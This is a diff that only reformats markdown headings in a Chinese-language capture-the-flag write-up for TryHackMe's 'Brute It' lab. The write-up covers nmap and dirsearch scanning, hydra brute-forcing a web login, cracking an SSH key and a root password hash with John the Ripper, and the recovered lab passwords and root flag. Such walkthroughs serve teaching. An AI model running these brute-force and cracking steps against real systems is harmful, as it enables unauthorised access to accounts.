@@ -1,7 +1,7 @@
-#服务探测
+# 服务探测
 ```
 ┌──(root💀kali)-[~/tryhackme]
-└─# nmap -sV -Pn 10.10.218.99     
+└─#  nmap -sV -Pn 10.10.218.99     
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-08 03:18 EDT
 Nmap scan report for 10.10.218.99
@@ -18,10 +18,10 @@ Nmap done: 1 IP address (1 host up) scanned in 85.58 seconds
 
 
 
-#目录爆破
+# 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.218.99
+└─#  python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.218.99
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -43,11 +43,11 @@ Target: http://10.10.218.99
 
 所以我们现在知道登录的账号名是:```admin```，ssh的用户名是：```john```
 
-#用hydra爆破登录密码
+# 用hydra爆破登录密码
 
 ```
 ┌──(root💀kali)-[~/tryhackme/bruteit]
-└─# hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.218.99 http-post-form "/admin/:user=admin&pass=^PASS^&submit=LOGIN:Username or password invalid" -I -v
+└─#  hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.218.99 http-post-form "/admin/:user=admin&pass=^PASS^&submit=LOGIN:Username or password invalid" -I -v
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-08 03:36:32
@@ -71,20 +71,20 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-08 03:37:
 
 把登录页面的rsa复制下来，在本地保存成文件id_rsa
 
-#用ssh2john把rsa改成john能识别的哈希
+# 用ssh2john把rsa改成john能识别的哈希
 ```
 ┌──(root💀kali)-[~/tryhackme/bruteit]
-└─# locate ssh2john.py                
+└─#  locate ssh2john.py                
 /usr/share/john/ssh2john.py
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/bruteit]
-└─# /usr/share/john/ssh2john.py id_rsa >rsacrack
+└─#  /usr/share/john/ssh2john.py id_rsa >rsacrack
 ```
 
-#john开始破解
+# john开始破解
 ```
 ┌──(root💀kali)-[~/tryhackme/bruteit]
-└─# john --wordlist=/usr/share/wordlists/rockyou.txt rsacrack
+└─#  john --wordlist=/usr/share/wordlists/rockyou.txt rsacrack
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
@@ -103,13 +103,13 @@ Session completed
 得到rsa密码：```rockinroll```
 
 
-#登录ssh拿到user.txt
+# 登录ssh拿到user.txt
 ```
 ┌──(root💀kali)-[~/tryhackme/bruteit]
-└─# chmod 600 id_rsa                                                                                                                                                                                                                  130 ⨯
+└─#  chmod 600 id_rsa                                                                                                                                                                                                                  130 ⨯
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/bruteit]
-└─# ssh -i id_rsa john@10.10.218.99
+└─#  ssh -i id_rsa john@10.10.218.99
 Enter passphrase for key 'id_rsa': 
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 
@@ -188,7 +188,7 @@ john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1sl
 再次用john破解
 ```
 ┌──(root💀kali)-[~/tryhackme/bruteit]
-└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+└─#  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
@@ -203,14 +203,14 @@ Session completed
 
 拿到root凭证：```root:football```
 
-#登录root账户，拿到root flag
+# 登录root账户，拿到root flag
 ```
 john@bruteit:~$ su root
 Password: 
-root@bruteit:/home/john# cat /root/root.txt 
+root@bruteit:/home/john#  cat /root/root.txt 
 THM{pr1v1l3g3_3sc4l4t10n}
-root@bruteit:/home/john# 
+root@bruteit:/home/john#  
 ```
 
-#总结
+# 总结
 很简单的机器，主要考察各种暴力破解工具的使用。
